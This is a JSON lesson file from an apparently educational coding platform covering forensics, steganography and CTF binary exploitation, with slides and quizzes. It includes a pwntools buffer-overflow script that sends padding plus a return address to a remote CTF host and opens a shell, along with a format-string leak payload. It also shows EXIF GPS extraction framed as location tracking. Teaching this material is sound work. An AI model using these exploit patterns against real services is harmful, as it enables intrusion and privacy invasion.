@@ -1,0 +1,135 @@
+{
+    "id": "learn_forensics_stega",
+    "topicId": "forensics_stega",
+    "topicTitle": "Forensics, Steganography & CTF",
+    "description": "Learn advanced cybersecurity concepts. Analyze raw file bytes, hide secrets inside images, and exploit vulnerable C programs using Python's pwntools.",
+    "baseKP": 75,
+    "slides": [
+        {
+            "id": "ctf_1",
+            "type": "content",
+            "title": "Capture The Flag (CTF)",
+            "content": "# Hacker Games 🚩\n\nIn the cybersecurity world, professionals test their skills in competitions called **CTFs (Capture The Flag)**.\n\nCompetitors are given vulnerable applications, corrupted files, or encrypted messages. They must use their skills to extract a hidden \"Flag\" (a string like `flag{y0u_h4cked_1t}`).\n\nPython is the undisputed king language for CTFs because it allows you to script solutions incredibly fast."
+        },
+        {
+            "id": "ctf_2",
+            "type": "content",
+            "title": "Digital Forensics",
+            "content": "# Analyzing Files 🕵️\n\nDigital Forensics involves extracting evidence from files or devices.\n\nOften, hackers will try to disguise a malicious executable (`.exe`) by renaming it to a text file (`.txt`). Relying on file extensions is insecure.\n\nYou can use the `python-magic` library to read the \"Magic Bytes\" (the very first few bytes of a file) to determine its true nature, regardless of its extension.\n\n```bash\npip install python-magic\n```"
+        },
+        {
+            "id": "ctf_3",
+            "type": "content",
+            "title": "Using python-magic",
+            "content": "# Reading Magic Bytes 🪄\n\n```python_not\nimport magic\n\n# Imagine a hacker uploaded 'innocent.pdf'\nfile_path = \"innocent.pdf\"\n\n# Detect the actual MIME type based on the file contents\nmime_type = magic.from_file(file_path, mime=True)\n\nprint(f\"The file is actually: {mime_type}\")\n\nif mime_type == \"application/x-dosexec\":\n    print(\"ALERT: This is a Windows Executable, NOT a PDF!\")\n```"
+        },
+        {
+            "id": "ctf_4",
+            "type": "content",
+            "title": "Hex Dumps",
+            "content": "# Reading Raw Bytes 🔍\n\nSometimes you need to look at the raw bytes of a file to find hidden text or corrupted data. A **Hex Dump** displays the binary data as hexadecimal alongside the ASCII representation.\n\n```python_not\ndef hex_dump(data):\n    # Process 16 bytes at a time\n    for i in range(0, len(data), 16):\n        chunk = data[i:i+16]\n        \n        # Convert to hex (e.g., '48 65 6c 6c 6f')\n        hex_vals = ' '.join(f\"{b:02x}\" for b in chunk)\n        \n        # Convert to ASCII, replacing non-printable chars with '.'\n        ascii_vals = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)\n        \n        # Print formatted row\n        print(f\"{i:04x}   {hex_vals:<48}  {ascii_vals}\")\n\n# Dump a simple string\nhex_dump(b\"Hello World!\\x00\\x01HiddenData\")\n```"
+        },
+        {
+            "id": "ctf_5",
+            "type": "content",
+            "title": "Metadata Extraction",
+            "content": "# EXIF Data 📸\n\nWhen you take a photo with your smartphone, it embeds hidden **Metadata** (EXIF data) inside the JPEG file, including the exact GPS coordinates where the photo was taken, and the camera model.\n\nHackers can extract this to track locations.\n\n```bash\npip install Pillow\n```\n\n```python_not\nfrom PIL import Image\nfrom PIL.ExifTags import TAGS\n\nimg = Image.open(\"vacation.jpg\")\nexif_data = img.getexif()\n\nfor tag_id, value in exif_data.items():\n    # Convert the numerical tag ID into a human-readable name\n    tag_name = TAGS.get(tag_id, tag_id)\n    print(f\"{tag_name}: {value}\")\n```"
+        },
+        {
+            "id": "ctf_quiz_1",
+            "type": "quiz",
+            "title": "Forensics Quiz",
+            "content": "Test your forensics knowledge.",
+            "quizQuestion": "Why do cybersecurity professionals use 'Magic Bytes' (via the `python-magic` library) instead of checking the file extension (like `.jpg`) to determine what kind of file a user uploaded?",
+            "quizOptions": [
+                "Because Magic Bytes automatically scan the file for viruses.",
+                "Because Magic Bytes compress the file to save server space.",
+                "Because hackers can easily rename a malicious `.exe` file to `.jpg`. Magic Bytes look at the actual binary header of the file, which cannot easily be faked without corrupting the file.",
+                "Because Python cannot read file extensions directly."
+            ],
+            "correctOptionIndex": 2
+        },
+        {
+            "id": "ctf_6",
+            "type": "content",
+            "title": "Steganography",
+            "content": "# Hiding in Plain Sight 🥷\n\nCryptography scrambles a message so it can't be read. **Steganography** hides the *existence* of the message entirely.\n\nThe most common method is **LSB (Least Significant Bit) Steganography**.\n\nA digital image is made of pixels. Each pixel has a Red, Green, and Blue value from 0 to 255. In binary, `255` is `11111111`.\n\nIf we change the *last bit* (the least significant bit) from `1` to `0`, the value becomes `254`. The human eye cannot tell the difference between Red 255 and Red 254!"
+        },
+        {
+            "id": "ctf_7",
+            "type": "content",
+            "title": "LSB Steganography Concept",
+            "content": "# The Binary Injection 💉\n\nBy systematically altering the very last bit of thousands of pixels in an image, we can hide an entire secret text file inside a seemingly normal photograph.\n\n1. Convert the secret message \"HI\" into binary.\n2. \"H\" is `01001000`.\n3. Take 8 pixels from the image.\n4. Replace the last bit of the first pixel with `0`.\n5. Replace the last bit of the second pixel with `1`.\n6. And so on...\n\nWhen the receiver gets the image, they simply extract the last bit from every pixel and reconstruct the binary string!"
+        },
+        {
+            "id": "ctf_8",
+            "type": "content",
+            "title": "Automating Steganography",
+            "content": "# Using the `stegano` library 🖼️\n\nWriting the binary bit-shifting code manually is tedious. We can use Python libraries to do this for us.\n\n```bash\npip install stegano\n```\n\n```python_not\nfrom stegano import lsb\n\n# Hide a message inside 'normal_photo.png'\n# This generates a new file 'secret_photo.png'\nsecret = lsb.hide(\"normal_photo.png\", \"Attack at dawn! 🏴‍☠️\")\nsecret.save(\"secret_photo.png\")\n\nprint(\"Message hidden successfully.\")\n```"
+        },
+        {
+            "id": "ctf_9",
+            "type": "content",
+            "title": "Extracting Steganography",
+            "content": "# Revealing the Secret 🔍\n\nThe receiver simply uses the same library on the altered image.\n\n```python_not\nfrom stegano import lsb\n\n# The image looks completely normal to the naked eye\n# But Python extracts the least significant bits to rebuild the string\nmessage = lsb.reveal(\"secret_photo.png\")\n\nprint(f\"Decoded Message: {message}\")\n# Output: Attack at dawn! 🏴‍☠️\n```"
+        },
+        {
+            "id": "ctf_quiz_2",
+            "type": "quiz",
+            "title": "Steganography Quiz",
+            "content": "Check your understanding of hidden messages.",
+            "quizQuestion": "In Least Significant Bit (LSB) Steganography within an image, why is it practically impossible for the human eye to detect that the image has a hidden message?",
+            "quizOptions": [
+                "Because the message is encrypted using AES.",
+                "Because only the final bit of the 8-bit color value is altered (e.g., changing 255 to 254), which causes a color shift so microscopic the human eye cannot perceive it.",
+                "Because the message is written in invisible ink.",
+                "Because the message is stored in a separate text file."
+            ],
+            "correctOptionIndex": 1
+        },
+        {
+            "id": "ctf_10",
+            "type": "content",
+            "title": "Binary Exploitation",
+            "content": "# Attacking Compiled Code 💥\n\nThe highest level of CTFs involves **Pwn** (Binary Exploitation).\n\nCompetitors are given a vulnerable, compiled C program running on a remote server. The program usually has a Buffer Overflow or Format String vulnerability.\n\nThe goal is to send a carefully crafted payload of raw hex bytes to the program to overwrite its memory stack and hijack its execution flow to run your own shellcode."
+        },
+        {
+            "id": "ctf_11",
+            "type": "content",
+            "title": "Introduction to pwntools",
+            "content": "# The Exploit Framework: `pwntools` 💣\n\nWriting exploit payloads manually with `socket` and `struct.pack` is agonizing. \n\n`pwntools` is the industry standard Python exploit development framework. It makes interacting with remote binaries and packing memory addresses trivial.\n\n```bash\n# Note: pwntools is usually installed on Linux (Kali/Ubuntu)\npip install pwntools\n```"
+        },
+        {
+            "id": "ctf_12",
+            "type": "content",
+            "title": "Using pwntools",
+            "content": "# Writing an Exploit 🛠️\n\nHere is how a hacker might use `pwntools` to exploit a simple Buffer Overflow.\n\n```python_not\nfrom pwn import *\n\n# Connect to the remote vulnerable server\nio = remote('ctf.hacker.com', 1337)\n\n# Wait for the prompt\nio.recvuntil(b\"Enter your name: \")\n\n# Craft the payload:\n# 1. Send 64 bytes of garbage ('A') to fill the buffer\n# 2. Append the memory address of the hidden 'win()' function \n#    (p64 automatically packs it as a 64-bit little-endian integer!)\npayload = b\"A\" * 64 + p64(0x401236)\n\n# Send the exploit payload\nio.sendline(payload)\n\n# Switch to interactive mode so we can type in the newly spawned shell!\nio.interactive()\n```"
+        },
+        {
+            "id": "ctf_13",
+            "type": "content",
+            "title": "Format String Attacks",
+            "content": "# Leaking Memory 🧠\n\nAnother common binary vulnerability occurs when C developers use `printf(user_input)` instead of `printf(\"%s\", user_input)`.\n\nIf the user inputs `%x %x %x`, the program will read off the stack and leak raw memory values (which might contain passwords or memory addresses) back to the user!\n\n`pwntools` can automate this to leak exactly what you need.\n\n```python_not\nfrom pwn import *\n\n# Create a payload to leak the 7th item on the stack\npayload = b\"%7$x\"\n\n# (Send payload using the remote() script from previous slide)\n```"
+        },
+        {
+            "id": "ctf_quiz_3",
+            "type": "quiz",
+            "title": "Exploit Quiz",
+            "content": "Test your pwntools knowledge.",
+            "quizQuestion": "In `pwntools`, what is the purpose of the `p64()` function when crafting a payload?",
+            "quizOptions": [
+                "It pings the remote server 64 times.",
+                "It pauses the script for 64 seconds.",
+                "It takes a Python integer (representing a memory address) and automatically packs it into a raw, 64-bit, little-endian bytestring required for binary exploitation.",
+                "It generates 64 random bytes."
+            ],
+            "correctOptionIndex": 2
+        },
+        {
+            "id": "ctf_14",
+            "type": "content",
+            "title": "Summary",
+            "content": "# Advanced Hacker! 🎉\n\nYou've completed the Cybersecurity module! You now have the skills to compete in CTFs.\n\n## Key Takeaways\n\n- ✅ **Forensics:** Don't trust file extensions. Use `python-magic` to read the true file headers. Use Pillow to extract hidden GPS EXIF data.\n- ✅ **Hex Dumps:** Viewing raw binary data is essential for finding hidden flags.\n- ✅ **Steganography:** Use LSB manipulation to hide secret messages inside the pixels of ordinary images.\n- ✅ **Pwntools:** The ultimate framework for binary exploitation. Use `remote()`, `recvuntil()`, and `p64()` to rapidly script Buffer Overflow and Format String attacks.\n\nUse these skills ethically to secure systems, not to attack them!"
+        }
+    ]
+}
